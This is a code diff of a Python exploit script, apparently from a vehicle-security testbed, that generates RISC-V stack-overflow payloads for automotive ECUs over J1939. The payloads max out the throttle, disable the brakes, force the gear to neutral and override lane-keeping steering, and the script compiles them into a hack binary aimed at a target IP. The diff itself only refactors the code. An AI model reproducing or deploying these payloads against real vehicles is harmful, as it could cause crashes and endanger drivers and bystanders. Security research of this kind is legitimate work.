@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#! /usr/bin/env python3
 """
 Hack critical systems
 
@@ -16,6 +16,7 @@ NOTE: for testing, the binary can be executed on any PC that is connected to the
 
 """
 import os
+import subprocess
 import argparse
 
 # Returns back to prvCanRxTask
@@ -133,9 +134,8 @@ j1939_hack_dir = "j1939hack"
 j1939_header = "main.h"
 
 def hack_generate_payload(hacktype):
-    print(">>> Generating hack payload.")
+    print(f">>> Generating hack payload for the {hacktype} hack.")
     if hacktype == THROTTLE_HACK:
-        print(THROTTLE_HACK)
         # Set throttle_min to -900
         # Set throttle_gain to int16_max (32767)
         payload = [
@@ -149,7 +149,6 @@ def hack_generate_payload(hacktype):
                     "ret\n", # initiate jump
                 ]
     elif hacktype == BRAKE_HACK:
-        print(BRAKE_HACK)
         # Set brake_gain to 0 to disable brake
         payload = [
                     "li t3, {}\n".format(hex(BRAKE_GAIN_ADDR)), # load location of the variable
@@ -159,7 +158,6 @@ def hack_generate_payload(hacktype):
                     "ret\n", # initiate jump
                 ]
     elif hacktype == GEAR_HACK:
-        print(GEAR_HACK)
         # Replace all assignments in switch statement for tmp_gear
         # to be 'N'
         payload = [
@@ -170,7 +168,6 @@ def hack_generate_payload(hacktype):
                     "ret\n", # initiate jump
                 ]
     elif hacktype == LKAS_HACK:
-        print(LKAS_HACK)
         # Set camera_ok =1
         # Set steering_assist to some value
         payload = [
@@ -193,9 +190,9 @@ def hack_generate_payload(hacktype):
     # Compile
     print(">>> Building malicious payload.")
     cmd = "riscv64-unknown-elf-as -march=rv64ima ecu.asm -o ecu.elf"
-    os.system(cmd)
+    subprocess.call(cmd,shell=True)
     cmd = "riscv64-unknown-elf-objcopy -O binary --only-section=.text ecu.elf ecu.bin"
-    os.system(cmd)
+    subprocess.call(cmd,shell=True)
     # read data from temporary payload file
     print(">>> Reading data from temporary payload file")
     with open("ecu.bin", "r+b") as f:
@@ -210,7 +207,7 @@ def hack_generate_payload(hacktype):
                 len(fp_bytes) - len(ra_bytes)) + \
                 fp_bytes + ra_bytes
     print(f">>> Padded payload is {len(payload)} bytes long")
-    return "{" + ''.join([hex(c) + "," for c in  payload]) + "}"
+    return "{" + ','.join([hex(c) for c in payload]) + "}"
 
 
 def hack_generate_header(ip, port, hacktype):
@@ -239,14 +236,13 @@ def hack_compile(test=False):
     if test:
         host = "-x86"
     cmd = f"cd {j1939_hack_dir}; make clean; make hack{host}; cd .."
-    print(cmd)
-    os.system(cmd)
+    subprocess.call(cmd,shell=True)
 
 def main():
     print("Starting hacking critical systems!")
     parser = argparse.ArgumentParser(description='hack critical systems')
     parser.add_argument('--ip', help='target IP address', default=DEFAULT_IP)
-    parser.add_argument('--port', help='target RX port', default=DEFAULT_PORT)
+    parser.add_argument('--port', type=int, help='target RX port', default=DEFAULT_PORT)
     parser.add_argument('--type', help='Type of hack', choices=HACKS,default=THROTTLE_HACK)
     parser.add_argument('--test', help='test mode (no exploit)', action='store_true')
     args = parser.parse_args()
